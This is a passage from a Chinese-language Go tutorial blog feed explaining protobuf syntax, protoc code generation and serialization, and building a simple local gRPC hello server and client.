class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法相关：</p><ol><li>protobuf 有2个版本，默认版本是 proto2，如果需要 proto3，则需要在非空非注释第一行使用 syntax = “proto3” 标明版本。</li><li>package，即包名声明符是可选的，用来防止不同的消息类型有命名冲突。如果需要指定不一样的包名，可以使用go_package选项</li><li>repeated 表示字段可重复，即用来表示 Go 语言中的数组类型。</li><li>每个字符 =后面的数字称为标识符，每个字段都需要提供一个唯一的标识符。</li><li>当在传递数据时，对于required数据类型，如果用户没有设置值，则使用默认值传递到对端</li><li>文件名使用小写下划线的命名风格，例如 lower_snake_case.proto</li><li>命名规范：</li></ol><ul><li>消息名使用首字母大写驼峰风格(CamelCase),例如message StudentRequest;</li><li>字段名使用小写下划线的风格，例如 string status_code = 1;</li><li>枚举类型，枚举名使用首字母大写驼峰风格，例如 enum FooBar，枚举值使用全大写下划线隔开的风格(CAPITALS_WITH_UNDERSCORES )，例如 FOO_DEFAULT=1</li></ul><h2 id="protobuf转go"><a href="#protobuf转go" class="headerlink" title="protobuf转go"></a>protobuf转go</h2><p>进入到proto/目录下，进行协议转go代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --go_out&#x3D;. *.proto</span><br></pre></td></tr></table></figure><p>生成go的协议文件proto/pb/proto_demo/user.pb.go</p><p>文件组织结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum</span><br><span class="line">├── main.go</span><br><span class="line">├── proto</span><br><span class="line">│   ├── pb</span><br><span class="line">│   │   └── proto_demo</span><br><span class="line">│   │       └── user.pb.go</span><br><span class="line">│   └── user.proto</span><br></pre></td></tr></table></figure><p>proto转化的go代码,无需手动修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Code generated by protoc-gen-go. DO NOT EDIT.</span></span><br><span class="line"><span class="comment">// versions:</span></span><br><span class="line"><span class="comment">// protoc-gen-go v1.26.0</span></span><br><span class="line"><span class="comment">// protoc        v3.13.0</span></span><br><span class="line"><span class="comment">// source: user.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> proto_demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">protoreflect <span class="string">&quot;google.golang.org/protobuf/reflect/protoreflect&quot;</span></span><br><span class="line">protoimpl <span class="string">&quot;google.golang.org/protobuf/runtime/protoimpl&quot;</span></span><br><span class="line">reflect <span class="string">&quot;reflect&quot;</span></span><br><span class="line">sync <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// Verify that this generated code is sufficiently up-to-date.</span></span><br><span class="line">_ = protoimpl.EnforceVersion(<span class="number">20</span> - protoimpl.MinVersion)</span><br><span class="line"><span class="comment">// Verify that runtime/protoimpl is sufficiently up-to-date.</span></span><br><span class="line">_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - <span class="number">20</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">state         protoimpl.MessageState</span><br><span class="line">sizeCache     protoimpl.SizeCache</span><br><span class="line">unknownFields protoimpl.UnknownFields</span><br><span class="line"></span><br><span class="line">Name    <span class="keyword">string</span>           <span class="string">`protobuf:&quot;bytes,1,opt,name=name,proto3&quot; json:&quot;name,omitempty&quot;`</span></span><br><span class="line">Male    <span class="keyword">bool</span>             <span class="string">`protobuf:&quot;varint,2,opt,name=male,proto3&quot; json:&quot;male,omitempty&quot;`</span></span><br><span class="line">Scores  []<span class="keyword">int32</span>          <span class="string">`protobuf:&quot;varint,3,rep,packed,name=scores,proto3&quot; json:&quot;scores,omitempty&quot;`</span></span><br><span class="line">Subject <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int32</span> <span class="string">`protobuf:&quot;bytes,4,rep,name=subject,proto3&quot; json:&quot;subject,omitempty&quot; protobuf_key:&quot;bytes,1,opt,name=key,proto3&quot; protobuf_val:&quot;varint,2,opt,name=value,proto3&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">Reset</span><span class="params">()</span></span> &#123;</span><br><span class="line">*x = Student&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> protoimpl.UnsafeEnabled &#123;</span><br><span class="line">mi := &amp;file_user_proto_msgTypes[<span class="number">0</span>]</span><br><span class="line">ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))</span><br><span class="line">ms.StoreMessageInfo(mi)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> protoimpl.X.MessageStringOf(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*Student)</span> <span class="title">ProtoMessage</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">ProtoReflect</span><span class="params">()</span> <span class="title">protoreflect</span>.<span class="title">Message</span></span> &#123;</span><br><span class="line">mi := &amp;file_user_proto_msgTypes[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> protoimpl.UnsafeEnabled &amp;&amp; x != <span class="literal">nil</span> &#123;</span><br><span class="line">ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))</span><br><span class="line"><span class="keyword">if</span> ms.LoadMessageInfo() == <span class="literal">nil</span> &#123;</span><br><span class="line">ms.StoreMessageInfo(mi)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ms</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mi.MessageOf(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Deprecated: Use Student.ProtoReflect.Descriptor instead.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*Student)</span> <span class="title">Descriptor</span><span class="params">()</span> <span class="params">([]<span class="keyword">byte</span>, []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> file_user_proto_rawDescGZIP(), []<span class="keyword">int</span>&#123;<span class="number">0</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">GetName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> x != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x.Name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">GetMale</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> x != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x.Male</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">GetScores</span><span class="params">()</span> []<span class="title">int32</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> x != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x.Scores</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x *Student)</span> <span class="title">GetSubject</span><span class="params">()</span> <span class="title">map</span>[<span class="title">string</span>]<span class="title">int32</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> x != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x.Subject</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">后续代码无需关注</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="protobuf序列化和反序列化的实践"><a href="#protobuf序列化和反序列化的实践" class="headerlink" title="protobuf序列化和反序列化的实践"></a>protobuf序列化和反序列化的实践</h2><p>下面给出一个go使用protobuf对对象进行序列化以及反序列化的一个实战例子，用的prttobuf协议是我们上面刚定义好的Student.proto。</p><p>main.go的调用，验证序列化前后数据是否一致</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/golang/protobuf/proto&quot;</span></span><br><span class="line"><span class="string">&quot;web_demo/proto/pb/proto_demo&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">test := &amp;proto_demo.Student &#123;</span><br><span class="line">Name: <span class="string">&quot;James&quot;</span>,</span><br><span class="line">Male: <span class="literal">true</span>,</span><br><span class="line">Scores: []<span class="keyword">int32</span>&#123;<span class="number">98</span>, <span class="number">85</span>, <span class="number">88</span>&#125;,</span><br><span class="line">Subject: <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int32</span>&#123;<span class="string">&quot;age&quot;</span>:<span class="number">18</span>, <span class="string">&quot;level&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">data, err := proto.Marshal(test)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;proto encode error: &quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">newTest := &amp;proto_demo.Student&#123;&#125;</span><br><span class="line">err = proto.Unmarshal(data, newTest)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;proto decode error: &quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> test.GetScores()[<span class="number">1</span>] != newTest.GetScores()[<span class="number">1</span>] &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;data mismatch score %d != %d&quot;</span>, test.GetScores()[<span class="number">1</span>], newTest.GetScores()[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> test.GetName() != newTest.GetName() &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;data mismatch name %s != %s&quot;</span>, test.GetName(), newTest.GetName())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;data match!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h1><h2 id="gRPC的特点"><a href="#gRPC的特点" class="headerlink" title="gRPC的特点"></a>gRPC的特点</h2><ul><li>gRPC由google开发，是一款语言中立、平台中立、开源的远程过程调用系统,基于HTTP2协议标准设计开发</li><li>gRPC可以实现微服务，将大的项目拆分为多个小且独立的业务模块，也就是服务，各服务间使用高效的protobuf协议进行RPC调用，gRPC默认使用protocol buffers</li><li>支持多种开发语言</li></ul><p><img src="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94protobuf%E5%92%8CgRPC/1.png" alt="image"></p><p>一次RPC的完整流程：</p><ol><li>客户端（gRPC Sub）调用 A 方法，发起 RPC 调用</li><li>对请求信息使用 Protobuf 进行对象序列化压缩（IDL）</li><li>服务端（gRPC Server）接收到请求后，解码请求体，进行业务逻辑处理并返回</li><li>对响应结果使用 Protobuf 进行对象序列化压缩（IDL）</li><li>客户端接受到服务端响应，解码请求体。回调被调用的 A 方法，唤醒正在等待响应（阻塞）的客户端调用并返回响应结果</li></ol><p>我们在protobuf协议定义上扩展一个类型定义：Service，这在RPC通讯上有着重要作用。</p><h2 id="gRpc实战例子"><a href="#gRpc实战例子" class="headerlink" title="gRpc实战例子"></a>gRpc实战例子</h2><p>先定义一个hello服务协议，注意Hello结构体内声明了SayHello和SayHi两个接口，这两个接口需要在server侧实现，client侧会发起rpc直接调用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 指定proto版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定golang包名</span></span><br><span class="line">option go_package = <span class="string">&quot;pb/proto_demo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义Hello服务</span></span><br><span class="line">service Hello &#123;</span><br><span class="line">    <span class="comment">// 定义SayHello方法</span></span><br><span class="line">    rpc SayHello(HelloRequest) returns (HelloResponse) &#123;&#125;</span><br><span class="line">    rpc SayHi(HiRequest) returns (HiResponse) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloRequest 请求结构</span></span><br><span class="line">message HelloRequest &#123;</span><br><span class="line">    <span class="keyword">string</span> name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloResponse 响应结构</span></span><br><span class="line">message HelloResponse &#123;</span><br><span class="line">    <span class="keyword">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HiRequest 请求结构</span></span><br><span class="line">message HiRequest &#123;</span><br><span class="line">    <span class="keyword">string</span> name = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">string</span> school = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int32</span> age = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int32</span> grade = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int32</span> status = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HiResponse 响应结构</span></span><br><span class="line">message HiResponse &#123;</span><br><span class="line">    <span class="keyword">string</span> message = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int32</span> status = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到proto文件夹，执行指令生成grpc版本的协议go代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc -I . --go_out&#x3D;plugins&#x3D;grpc:. .&#x2F;hello.proto</span><br></pre></td></tr></table></figure><p>生成了文件proto/pb/hello.pb.go，项目组织如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├── client</span><br><span class="line">│   └── main.go</span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum  </span><br><span class="line">├── proto</span><br><span class="line">│   ├── hello.proto</span><br><span class="line">│   ├── pb</span><br><span class="line">│   │   └── proto_demo</span><br><span class="line">│   │       ├── hello.pb.go</span><br><span class="line">│   │       └── user.pb.go</span><br><span class="line">│   └── user.proto</span><br><span class="line">└── server</span><br><span class="line">    └── main.go</span><br></pre></td></tr></table></figure><p>此时我们先编写服务器一侧的service：server/main.go，主要功能是定义好监听地址端口，定义service相关函数SayHello和SayHi。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// server</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;web_demo/proto/pb/proto_demo&quot;</span></span><br><span class="line"><span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line"><span class="string">&quot;golang.org/x/net/context&quot;</span></span><br><span class="line"><span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// gRPC服务地址</span></span><br><span class="line">Address = <span class="string">&quot;127.0.0.1:9988&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> helloService <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> HelloService = helloService&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h helloService)</span> <span class="title">SayHello</span><span class="params">(ctx context.Context, in *proto_demo.HelloRequest)</span> <span class="params">(*proto_demo.HelloResponse, error)</span></span> &#123;</span><br><span class="line">resp := <span class="built_in">new</span>(proto_demo.HelloResponse)</span><br><span class="line">    resp.Message = fmt.Sprintf(<span class="string">&quot;Hello %s.&quot;</span>, in.Name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h helloService)</span> <span class="title">SayHi</span><span class="params">(ctx context.Context, in *proto_demo.HiRequest)</span> <span class="params">(*proto_demo.HiResponse, error)</span></span> &#123;</span><br><span class="line">resp := <span class="built_in">new</span>(proto_demo.HiResponse)</span><br><span class="line">    resp.Message = fmt.Sprintf(<span class="string">&quot;Hi %s, grade=%d, school=%s, grade=%d, status=%d&quot;</span>, in.Name, in.Grade, in.School, in.Grade, in.Status)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listen, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, Address)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        grpclog.Fatalf(<span class="string">&quot;Failed to listen: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s := grpc.NewServer()</span><br><span class="line"></span><br><span class="line">proto_demo.RegisterHelloServer(s, HelloService)</span><br><span class="line">fmt.Println(<span class="string">&quot;Listen on &quot;</span> + Address)</span><br><span class="line">grpclog.Println(<span class="string">&quot;Listen on &quot;</span> + Address)</span><br><span class="line">    s.Serve(listen)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动server/main.go，开始监听端口9988</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:server junshili$ go run main.go </span><br><span class="line">Listen on 127.0.0.1:9988</span><br></pre></td></tr></table></figure><p>开始编写client的发起rpc调用部分，生成文件client/main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// client</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;web_demo/proto/pb/proto_demo&quot;</span></span><br><span class="line"><span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line"><span class="string">&quot;golang.org/x/net/context&quot;</span></span><br><span class="line"><span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// gRPC服务地址</span></span><br><span class="line">Address = <span class="string">&quot;127.0.0.1:9988&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">conn, err := grpc.Dial(Address, grpc.WithInsecure())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">grpclog.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">c := proto_demo.NewHelloClient(conn)</span><br><span class="line"></span><br><span class="line">req := &amp;proto_demo.HelloRequest&#123;Name:<span class="string">&quot;grpc&quot;</span>&#125;</span><br><span class="line">res, err := c.SayHello(context.Background(), req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">grpclog.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(res.Message)</span><br><span class="line"></span><br><span class="line">req2 := &amp;proto_demo.HiRequest&#123;Name:<span class="string">&quot;grpc&quot;</span>, Grade:<span class="number">3</span>, Age:<span class="number">10</span>, Status:<span class="number">2</span>, School:<span class="string">&quot;zhuhai&quot;</span>&#125;</span><br><span class="line">res2, err := c.SayHi(context.Background(), req2)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">grpclog.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(res2.Message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动client/main.go，连接”127.0.0.1:9988”，请求rpc hello服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:client junshili$ go run main.go </span><br><span class="line">Hello grpc.</span><br><span class="line">Hi grpc, grade&#x3D;3, school&#x3D;zhuhai, grade&#x3D;3, status&#x3D;2</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go快速上手—Web服务器篇</title>
    <link href="/2021/05/05/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AF%87/"/>
    <url>/2021/05/05/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AF%87/</url>
    
